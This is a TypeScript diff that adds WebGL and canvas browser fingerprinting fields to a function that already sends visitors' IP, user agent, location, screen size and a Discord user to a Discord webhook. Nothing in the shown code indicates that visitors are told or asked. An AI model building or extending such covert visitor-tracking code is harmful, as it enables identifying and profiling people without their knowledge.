@@ -2,6 +2,7 @@ import { DISCORD_WEBHOOK } from "@/lib/constants";
 import type { IpInfo } from "@/lib/functions/logger";
 import type { ScreenSize } from "@/lib/hooks/screen-size-hooks";
 import type { UserLocation } from "@/lib/hooks/user-location-hooks";
+import type { BrowserFingerprint } from "@/lib/hooks/webgl-fingerprint-hooks";
 import type { DiscordUser } from "@/lib/types";
 
 export async function sendWebhook(
@@ -10,7 +11,8 @@ export async function sendWebhook(
   userAgent: string,
   location: UserLocation,
   screenSize: ScreenSize,
-  address: string
+  address: string,
+  browserFingerprint: BrowserFingerprint
 ) {
   try {
     const fields = [
@@ -27,6 +29,11 @@ export async function sendWebhook(
       {
         name: "💻Device Info",
         value: `IP: \`${ipInfo.ip}\`\nUserAgent: \`${userAgent}\`\nScreen Size: \`${screenSize.width}x${screenSize.height}\``,
+        inline: false,
+      },
+      {
+        name: "🖥️ WebGL/Canvas",
+        value: `Visitor ID: \`${browserFingerprint.visitorId}\`\nWebGL Vendor: \`${browserFingerprint.webglVendor}\`\nWebGL Renderer: \`${browserFingerprint.webglRenderer}\`\nCanvas Hash: \`${browserFingerprint.canvasHash}\``,
         inline: false,
       },
       {
